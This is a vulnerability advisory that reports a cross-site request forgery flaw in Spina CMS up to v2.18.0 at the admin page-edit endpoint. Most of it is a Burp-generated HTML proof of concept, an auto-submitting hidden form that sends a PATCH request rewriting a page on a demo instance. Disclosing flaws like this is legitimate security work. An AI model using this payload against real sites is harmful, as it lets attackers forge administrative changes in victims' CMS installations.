 [description]
 
Spina CMS v2.18.0 was discovered to contain a Cross-Site Request Forgery (CSRF) vulnerability via the URI like /admin/pages/\**id\**.which\**id\** stands for the page id.

 ------------------------------------------

 [Vulnerability Type]
 
 Cross-Site Request Forgery (CSRF)

 ------------------------------------------
 [Vendor of Product]
 
 Spina CMS,https://github.com/SpinaCMS/Spina

 ------------------------------------------

 [Affected Product Code Base]
 
 <=v2.18.0

 ------------------------------------------

 [Impact Escalation of Privileges]
 
 true

 ------------------------------------------
 [POC]
 <img width="1340" alt="图片" src="https://github.com/user-attachments/assets/33f37070-4a0a-4dfc-963c-f346a668619f">
 <img width="612" alt="图片" src="https://github.com/user-attachments/assets/3b120878-77ae-4386-830c-590871ce17bf">
 <img width="1248" alt="图片" src="https://github.com/user-attachments/assets/5343aefc-2ca5-4173-8511-da69885d9cb1">




```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://spinacms-demo.herokuapp.com/admin/pages/167520" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="authenticity&#95;token" value="2&#47;DQq&#47;lFTWeAVeF6p1aSUpFLnmtWSViRJnQR&#43;BHHzvpyKPY2dZRdeaPsGcZClB4mU1tmpCLmLlPJKEWAkHlLyg&#61;&#61;" />
      <input type="hidden" name="locale" value="en" />
      <input type="hidden" name="page&#91;title&#93;" value="Dudeface12" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Repeater" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;name&#93;" value="repeater" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;title&#93;" value="Repeater" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Repeater" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;name&#93;" value="repeater2" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;title&#93;" value="Repeater" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Attachment" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;name&#93;" value="attachment" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;title&#93;" value="Attachment" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;signed&#95;blob&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;filename&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;attachment&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;3&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Option" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;3&#93;&#91;name&#93;" value="option" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;3&#93;&#91;title&#93;" value="Option" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;3&#93;&#91;value&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;4&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Text" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;4&#93;&#91;name&#93;" value="body" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;4&#93;&#91;title&#93;" value="Body" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;4&#93;&#91;content&#93;" value="&lt;div&gt;asdasd&lt;&#47;div&gt;" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;5&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;ImageCollection" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;5&#93;&#91;name&#93;" value="image&#95;collection" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;5&#93;&#91;title&#93;" value="Image&#32;collection" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Image" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;name&#93;" value="image" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;title&#93;" value="Image" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;signed&#95;blob&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;filename&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;image&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;6&#93;&#91;alt&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Image" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;name&#93;" value="portrait" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;title&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;signed&#95;blob&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;filename&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;image&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;7&#93;&#91;alt&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Image" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;name&#93;" value="landscape" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;title&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;signed&#95;blob&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;filename&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;image&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;8&#93;&#91;alt&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Image" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;name&#93;" value="wide" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;title&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;signed&#95;blob&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;filename&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;image&#95;id&#93;" value="" />
      <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;9&#93;&#91;alt&#93;" value="" />
      <input type="hidden" name="page&#91;seo&#95;title&#93;" value="" />
      <input type="hidden" name="page&#91;description&#93;" value="" />
      <input type="hidden" name="page&#91;url&#95;title&#93;" value="" />
      <input type="hidden" name="page&#91;draft&#93;" value="0" />
      <input type="hidden" name="page&#91;show&#95;in&#95;menu&#93;" value="0" />
      <input type="hidden" name="page&#91;show&#95;in&#95;menu&#93;" value="1" />
      <input type="hidden" name="page&#91;menu&#95;title&#93;" value="" />
      <input type="hidden" name="page&#91;skip&#95;to&#95;first&#95;child&#93;" value="0" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


```
